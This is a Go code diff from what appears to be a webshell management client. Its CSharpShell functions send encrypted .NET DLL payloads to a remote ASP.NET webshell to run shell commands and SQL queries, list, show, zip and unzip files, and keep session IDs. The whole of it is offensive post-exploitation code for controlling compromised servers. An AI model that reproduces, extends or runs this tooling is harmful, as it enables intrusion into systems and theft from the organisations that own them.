@@ -18,6 +18,8 @@ func (s *CSharpShell) FreshSession(id int, url string, password string) (string,
 		// first init NetSessions shell
 		NetSessions = make(map[int]string)
 	}
+	password = util.GeneratePasswordSeed()
+
 	// Get the target code and encrypt
 	code, _ := os.ReadFile("./pkg/api/net/Check.dll")
 	// 加密code
@@ -31,7 +33,7 @@ func (s *CSharpShell) FreshSession(id int, url string, password string) (string,
 	session := NetSessions[id] // if key not exist, it returns "" , bcz type is string
 	log.Println("当前ASP.NET_SessionId " + session)
 
-	enResult, err := util.PostRequest(url, password, enCode, session)
+	enResult, err := util.PostRequest(url, password, enCode, session, s.GetShellType())
 	if err != nil {
 		return "", err
 	}
@@ -68,7 +70,7 @@ func (s *CSharpShell) ExecCommand(id int, command string, url string, password s
 
 	code, _ = os.ReadFile("./pkg/api/net/CMD.dll")
 	code = fmt.Appendf(code, "_____cmdPath-%s,exit-true,cmd-%s", cmdPath, command)
-	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -90,7 +92,7 @@ func (s *CSharpShell) ExecSql(id int, driver, host, port, user, pass, database, 
 			driver, host, port, user, pass, database, sql, option, encoding)
 	}
 
-	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -100,7 +102,7 @@ func (s *CSharpShell) ExecSql(id int, driver, host, port, user, pass, database, 
 func (s *CSharpShell) FileZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileZip.dll")
 	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
-	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -109,7 +111,7 @@ func (s *CSharpShell) FileZip(id int, srcPath string, toPath string, url string,
 func (s *CSharpShell) FileUnZip(id int, srcPath string, toPath string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileUnZip.dll")
 	code = fmt.Appendf(code, "_____srcPath-%s,toPath-%s", srcPath, toPath)
-	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -120,7 +122,7 @@ func (s *CSharpShell) FileUnZip(id int, srcPath string, toPath string, url strin
 func (s *CSharpShell) FileList(id int, path string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileList.dll")
 	code = fmt.Appendf(code, "_____path-%s", path)
-	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
@@ -130,7 +132,7 @@ func (s *CSharpShell) FileList(id int, path string, url string, password string)
 func (s *CSharpShell) FileShow(id int, path string, url string, password string) (string, error) {
 	code, _ := os.ReadFile("./pkg/api/net/FileShow.dll")
 	code = fmt.Appendf(code, "_____path-%s", path)
-	res, err := util.HookPost(url, password, string(code), password, s.GetShellType())
+	res, err := util.HookPost(url, password, string(code), NetSessions[id], s.GetShellType())
 	if err != nil {
 		return "", nil
 	}
